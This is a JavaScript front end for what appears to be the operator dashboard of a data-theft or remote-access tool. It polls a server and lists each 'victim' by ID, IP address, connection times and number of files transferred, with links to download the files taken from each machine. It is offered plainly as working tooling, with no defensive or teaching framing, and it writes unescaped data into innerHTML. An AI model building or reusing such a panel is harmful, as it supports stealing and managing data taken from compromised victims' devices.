// Function to fetch data from the server and update the dashboard
async function fetchData() {
  try {
      const response = await fetch('/dashboard-data');
      const data = await response.json();

      const tbody = document.querySelector('#devicesTable tbody');
      tbody.innerHTML = ''; 

      for (const [victimId, device] of Object.entries(data)) {
          const row = document.createElement('tr');
          row.innerHTML = `
              <td>${victimId}</td>
              <td>${device.ip}</td>
              <td>${new Date(device.connectionTime).toLocaleString()}</td>
              <td>${new Date(device.lastConnectionTime).toLocaleString()}</td>
              <td>${device.filesTransferred}</td>
              <td>
                  <button class="toggle-btn" onclick="toggleFiles('${victimId}')">Show Files</button>
                  <ul id="file-list-${victimId}" class="file-list hidden">
                      ${device.fileList.map(file => `
                          <li>
                              <a href="/download/${victimId}/${file}" download>${file}</a>
                          </li>`).join('')}
                  </ul>
              </td>
          `;
          tbody.appendChild(row);
      }
  } catch (error) {
      console.error('Error fetching dashboard data:', error);
  }
}

// Function to toggle file list visibility
function toggleFiles(victimId) {
  const fileList = document.getElementById(`file-list-${victimId}`);
  fileList.classList.toggle('hidden');
}

// Fetch data every 5 seconds to keep the dashboard updated
setInterval(fetchData, 5000);

// Fetch data immediately when the page loads
fetchData();
